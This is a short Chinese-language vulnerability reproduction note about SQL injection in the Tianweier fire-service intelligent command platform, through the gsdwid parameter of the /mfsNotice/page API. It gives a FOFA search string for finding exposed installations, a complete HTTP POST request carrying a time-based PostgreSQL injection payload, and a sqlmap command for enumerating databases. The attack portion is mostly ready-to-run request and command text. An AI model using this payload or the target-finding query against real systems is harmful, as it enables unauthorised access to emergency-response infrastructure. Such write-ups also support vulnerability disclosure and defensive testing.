# 天维尔消防智能指挥平台API接口页面sql注入

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">天维尔消防智能指挥平台是一个采用先进的信息技术和通信技术的系统，能够快速准确地获取和处理突发事件的信息，实现对灾害现场的实时监控和指挥调度，有效提升应急救援工作的能力和水平。天为消防智能指挥平台存在一个漏洞，影响组件API接口中/mfsNotice/page文件的未知代码。通过操纵参数gsdwid可以导致SQL注入</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 天维尔消防智能指挥平台

# 三、资产测绘
+ fofa`body="1997-2020 天维尔信息科技股份有限公司"`
+ 特征![1713248867816-c5d8010e-070f-4e92-8138-7526aa05d8fc.png](./img/bLXwGvRixXSMcwTn/1713248867816-c5d8010e-070f-4e92-8138-7526aa05d8fc-610098.png)

# 四、漏洞复现
```java
POST /twms-service-mfs/mfsNotice/page HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 103

{"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930')AND 5803=(SELECT 5803 FROM PG_SLEEP(3)) AND ('oJoi'='oJoi"},"hgubmt748n4":"="}
```

![1713248959286-64b5a565-ee51-45ab-8b52-05b56045b8a8.png](./img/bLXwGvRixXSMcwTn/1713248959286-64b5a565-ee51-45ab-8b52-05b56045b8a8-568512.png)

SQLMAP命令

```java
python3 sqlmap.py -r payload.txt --technique=T --time-sec 3  --dbs -v 3 --level 5 --random-agent
```

![1713251141032-131b90b2-330d-44bc-9445-51c55778e1e8.png](./img/bLXwGvRixXSMcwTn/1713251141032-131b90b2-330d-44bc-9445-51c55778e1e8-306551.png)



> 更新: 2024-04-20 22:02:56  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ch6s7681pfvp2rws>